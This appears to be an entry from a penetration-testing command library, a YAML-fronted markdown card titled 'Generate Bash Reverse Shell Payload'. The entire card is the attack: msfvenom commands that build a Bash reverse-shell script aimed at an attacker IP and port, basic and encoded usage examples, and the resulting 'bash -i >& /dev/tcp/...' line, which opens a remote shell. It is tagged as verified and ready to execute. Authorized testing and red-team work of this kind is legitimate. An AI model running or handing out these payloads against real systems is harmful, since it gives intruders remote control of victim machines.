---
id: b43a75fb-452c-4014-91b3-280f0eb53413
name: generate-bash-reverse-shell-payload
type: command
executor: bash
data: >-
  msfvenom -p cmd/unix/reverse_bash LHOST="$_LHOST" LPORT=$_LPORT -f raw >
  shell.sh
output: null
created_at: '2023-04-06T03:56:24.923786+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Linux
  - Unix
tags:
  - reverse-shell
  - bash
verified: true
validated: true
---

# Generate Bash Reverse Shell Payload

## Command

```bash
msfvenom -p cmd/unix/reverse_bash LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.sh
```

## Description

Generates a raw Bash script for Unix-like systems to establish a reverse shell connection using /bin/bash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker's IP for connection | Yes |
| $_LPORT | Listening port on attacker | Yes |
| -p cmd/unix/reverse_bash | Bash reverse payload type | Built-in |
| -f raw | Raw text output format | Built-in |
| > shell.sh | Save to shell.sh | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p cmd/unix/reverse_bash LHOST="192.168.1.100" LPORT=4444 -f raw > shell.sh
```

### Advanced Usage

```bash
msfvenom -p cmd/unix/reverse_bash LHOST="192.168.1.100" LPORT=4444 -f raw -e cmd/unix-generic > shell.sh
```

## Expected Output

Creates shell.sh with a single line like bash -i >& /dev/tcp/$_LHOST/$_LPORT 0>&1. File size <1 KB.

## Related

- [[commands/generate-python-reverse-shell-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
